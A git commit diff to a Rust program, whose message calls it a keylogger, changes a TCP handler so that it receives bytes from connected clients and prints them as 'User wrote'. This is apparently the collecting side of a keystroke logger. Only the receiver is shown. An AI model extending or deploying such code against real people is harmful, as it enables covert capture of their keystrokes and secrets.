ede64c8f794ba200e18c61ceddc1f13ea8d897a4
Dmytro Yatsenko <dima0102yacenko@gmail.com>
2026-07-15 14:16:17 +0200

    keylogger is enable

--- src/main.rs
+++ src/main.rs
@@ -3,16 +3,25 @@ use std::net::{TcpListener, TcpStream};
 
 fn handle_connection(mut stream: TcpStream) {
     println!("[*] client is connected");
+    let mut buf = [0; 512];
     loop {
         print!(">> ");
         io::stdout().flush().unwrap(); 
+        /*
         let mut input = String::new();
 
         io::stdin()
             .read_line(&mut input)
             .expect("could not read line");
 
-        stream.write_all(input.as_bytes()).unwrap();
+        stream.write_all(input.as_bytes()).unwrap(); 
+        */
+        while let Ok(bytes) = stream.read(&mut buf[..]) { 
+            let key = std::str::from_utf8(&buf[..bytes]);
+            println!("User wrote: {}", key.unwrap());
+        } 
+
+        return;
     }
 }
 
